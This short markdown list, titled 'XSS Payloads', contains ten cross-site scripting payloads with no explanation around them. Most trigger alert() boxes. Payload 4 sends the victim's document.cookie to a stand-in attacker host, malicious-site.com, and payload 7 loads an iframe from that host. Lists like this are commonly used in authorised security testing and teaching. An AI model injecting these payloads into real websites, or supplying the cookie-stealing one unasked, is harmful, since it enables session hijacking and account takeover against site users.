
## XSS Payloads

1. Payload 1: `<script>alert('XSS');</script>`
2. Payload 2: `<img src="x" onerror="alert('XSS');">`
3. Payload 3: `<svg onload="alert('XSS');"></svg>`
4. Payload 4: `<script>document.location='http://malicious-site.com/collect?data='+document.cookie;</script>`
5. Payload 5: `<a href="javascript:alert('XSS');">Click me</a>`
6. Payload 6: `<input type="text" value="<script>alert('XSS');</script>">`
7. Payload 7: `<iframe src="http://malicious-site.com"></iframe>`
8. Payload 8: `<body onload="alert('XSS');">`
9. Payload 9: `<div style="background-image: url(javascript:alert('XSS'));">Hello</div>`
10. Payload 10: `javascript:alert('XSS')`
